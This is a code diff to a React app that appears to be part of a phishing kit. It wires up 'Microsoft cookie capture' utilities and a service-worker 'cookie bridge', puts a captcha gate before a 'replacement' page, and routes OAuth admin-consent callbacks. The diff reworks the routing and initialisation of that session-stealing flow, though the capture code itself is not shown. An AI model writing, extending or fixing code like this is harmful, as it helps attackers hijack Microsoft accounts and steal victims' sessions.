@@ -8,46 +8,46 @@ import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
 import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';
 
 const App: React.FC = () => {
+    // The main Router component that wraps the application.
     return (
         <Router>
-            <MainContent />
+            <AppContent />
         </Router>
     );
 };
 
-const MainContent: React.FC = () => {
-    const [currentPage, setCurrentPage] = useState('captcha');
-    const location = useLocation();
-
+const AppContent: React.FC = () => {
+    // This hook ensures that cookie utilities are initialized once when the app loads.
     useEffect(() => {
         try {
             console.log('✅ Microsoft cookie capture utilities initialized');
-            
-            // Make functions globally available for replacement.html
             if (typeof window !== 'undefined') {
                 (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                 (window as any).microsoftCookieBridge = microsoftCookieBridge;
             }
-
-            // Initialize Microsoft Cookie Bridge with Service Worker
             console.log('🚀 Initializing Microsoft Cookie Bridge...');
             initializeMicrosoftCookieBridge();
-            
         } catch (error) {
             console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
         }
-    }, [location]);
+    }, []);
 
+    // ✅ FINAL FIX: Using the standard <Routes> component for robust routing.
+    // Both `/auth/callback` and the legacy path now point to the single,
+    // correct AdminConsentCallback component. The old AuthCallback is no longer used in this flow.
     return (
         <Routes>
             <Route path="/auth/callback" element={<AdminConsentCallback />} />
-            <Route path="/auth/callback/legacy" element={<AuthCallback />} />
-            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
+            <Route path="/auth/callback/legacy" element={<AdminConsentCallback />} />
+            <Route path="*" element={<DefaultPage />} />
         </Routes>
     );
 };
 
-const DefaultPage = ({ currentPage, setCurrentPage }: any) => {
+
+const DefaultPage: React.FC = () => {
+    const [currentPage, setCurrentPage] = useState('captcha');
+
     useEffect(() => {
         const urlParams = new URLSearchParams(window.location.search);
         const step = urlParams.get('step');
@@ -55,7 +55,7 @@ const DefaultPage = ({ currentPage, setCurrentPage }: any) => {
             setCurrentPage(step);
             window.history.replaceState({}, document.title, window.location.pathname);
         }
-    }, [setCurrentPage]);
+    }, []);
 
     const handleCaptchaVerified = () => {
         setCurrentPage('replacement');
